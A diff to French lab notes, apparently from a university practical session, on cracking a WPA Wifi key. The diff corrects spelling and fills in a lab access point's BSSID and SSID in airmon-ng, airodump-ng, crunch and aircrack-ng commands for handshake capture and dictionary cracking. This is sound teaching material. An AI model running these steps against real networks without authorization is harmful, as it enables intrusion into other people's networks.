@@ -1508,7 +1508,7 @@ Après activation du mode de surveillance, la carte Wifi se nomme `wlan0mon`.
 airmon-ng start wlan0mon
 ```
 
-* Lancer une écoute de tout les paquets Wifi qui circulent afin de déterminer les paramètres du réseau à attaquer :
+* Lancer une écoute de tous les paquets Wifi qui circulent afin de déterminer les paramètres du réseau Wifi à attaquer :
 ```
 airodump-ng wlan0mon
 ```
@@ -1567,18 +1567,18 @@ airmon-ng start wlan0mon
 ```
 Après activation du mode de surveillance, la carte Wifi se nomme `wlan0mon`.
 
-* Lancer une écoute de tout les paquets Wifi qui circulent afin de déterminer les paramètres du réseau à attaquer :
+* Lancer une écoute de tous les paquets Wifi qui circulent afin de déterminer les paramètres du réseau Wifi à attaquer :
 ```
 airodump-ng wlan0mon
 ```
 Récupérer les informations suivantes :  
-&ensp; &rarr; BSSID	- :::::  
-&ensp; &rarr; Canal	-   
-&ensp; &rarr; SSID	- 
+&ensp; &rarr; BSSID	- 44:AD:D9:5F:87:02  
+&ensp; &rarr; Canal	- 3  
+&ensp; &rarr; SSID	- kracotte03
 
 * Cibler la recherche vers le point d'accès pour capturer les VI générés par le PA :
 ```
-airodump-ng -c {Canal Wifi} --bssid {MAC point d'accès} -w psk wlan0mon
+airodump-ng -c 3 --bssid 44:AD:D9:5F:87:02 -w psk wlan0mon
 ```
 Il est nécessaire de capturer les VI issus d'un handshake (émis lors de la connexion d'un utilisateur au PA).  
 Pour cela, des cartes Raspberry Pi présentes dans la salle de TP se connectent aux différents réseaux Wifi WPA.  
@@ -1591,7 +1591,7 @@ crunch 8 8 0123456789 -o dictionnaire
 
 * Cassage de la PSK :
 ```
-aircrack-ng -w dictionnaire -b {MAC point d'accès} psk*.cap
+aircrack-ng -w dictionnaire -b 44:AD:D9:5F:87:02 psk*.cap
 ```
 
 ```
